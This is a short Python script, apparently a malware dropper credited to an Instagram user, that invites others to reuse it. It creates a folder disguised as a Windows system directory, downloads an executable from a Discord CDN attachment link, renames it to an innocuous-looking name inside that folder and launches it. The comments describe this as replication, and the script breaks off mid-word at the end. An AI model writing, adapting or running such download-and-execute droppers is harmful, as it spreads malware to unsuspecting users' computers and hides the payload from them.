
#If this is ever made open source, feel free to skid
#Made by @assvre on Instagram





#██╗ ███╗   ███╗██████╗  ██████╗ ██████╗ ████████╗███████╗
#██║ ████╗ ████║██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝
#██║ ██╔████╔██║██████╔╝██║   ██║██████╔╝   ██║   ███████╗
#██║ ██║╚██╔╝██║██╔═══╝ ██║   ██║██╔══██╗   ██║   ╚════██║
#██║ ██║ ╚═╝ ██║██║     ╚██████╔╝██║  ██║   ██║   ███████║
#╚═╝ ╚═╝     ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝

import requests, os, shutil, time, urllib.request, subprocess
from pathlib import Path





#██████╗ ███████╗██████╗ ██╗     ██╗ ██████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
#██╔══██╗██╔════╝██╔══██╗██║     ██║██╔════╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
#██████╔╝█████╗  ██████╔╝██║     ██║██║     ███████║   ██║   ██║██║   ██║██╔██╗ ██║
#██╔══██╗██╔══╝  ██╔═══╝ ██║     ██║██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
#██║  ██║███████╗██║     ███████╗██║╚██████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
#╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

PATH = r"C:\$Windows.~SXK" #Name of Folder that will be created, this is disguised as a Windows Folder
try:
	os.mkdir(PATH) #Checks if this exe has already been ran and therefore replication is finished
except:
	print("exists")
url = 'https://cdn.discordapp.com/attachments/939284765427777557/1003012890133016757/main.exe' #The URL for the replicated exe
r = requests.get(url, allow_redirects=True)
open('main.exe', 'wb').write(r.content) #Downloads the exe to the folder this exe is in
Path(r"main.exe").rename(r"C:\$Windows.~SXK\XMICNEI.exe") #Moves the exe to your newly created folder
os.startfile(r"C:\$Windows.~SXK\XMICNEI.exe") #Runs the ex